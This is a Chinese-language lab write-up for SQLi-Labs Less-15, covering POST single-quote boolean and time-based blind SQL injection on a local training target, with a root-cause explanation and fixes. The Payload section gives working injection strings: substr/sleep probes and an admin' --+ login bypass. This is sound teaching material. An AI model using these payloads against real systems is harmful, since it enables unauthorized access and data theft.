# SQLi-Labs | Less-15 POST 单引号 布尔/时间盲注
## 一、漏洞简介
POST登录注入，单引号闭合。页面不会输出SQL报错，也不会打印查询数据，只会根据登录结果返回两张不同图片，依靠页面返回差异做布尔盲注；当布尔差异不明显时，使用sleep延时做时间盲注。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-15/
注入类型：POST、字符型、单引号闭合、布尔盲注、时间盲注
## 三、复现步骤
1. BP抓包，拿到POST参数uname、passwd。
2. 测试闭合：uname输入 `admin'`，提交，页面无报错，图片变化。
3. 布尔测试：
   - uname=`admin' and 1=1 --+` 页面返回登录成功图片
   - uname=`admin' and 1=2 --+` 页面返回登录失败图片
   判定存在布尔盲注。
4. 构造if判断语句，配合substr逐字符猜解库名、表名、字段。
5. 当页面两张图片区分不明显时，使用sleep延时注入，观察响应时间判断条件真假。
## 四、Payload
布尔盲注猜库名第一个字符：
`uname=' and substr(database(),1,1)='s' --+ & passwd=1`
时间盲注：条件成立延时3秒
`uname=' and if(substr(database(),1,1)='s',sleep(3),1) --+ & passwd=1`
绕过登录：
`uname=admin' --+ & passwd=123`
## 五、漏洞原理
后端SQL：
`SELECT * FROM users WHERE username='$uname' AND password='$passwd'`
参数直接拼接，关闭了数据库错误回显。后端只根据SQL查询是否成功返回图片，没有明文数据输出，只能依靠页面状态或者响应时间判断注入语句真假。
## 六、修复方案
1. 预编译查询，禁止拼接输入。
2. 登录接口统一返回提示，不要根据查询结果区分页面内容。
3. 限制数据库sleep函数，增加请求频率限制。
## 七、总结
Less15是经典POST盲注关卡，没有报错信息，适合手工盲注或者sqlmap自动化跑。区分布尔盲注和时间盲注的使用场景。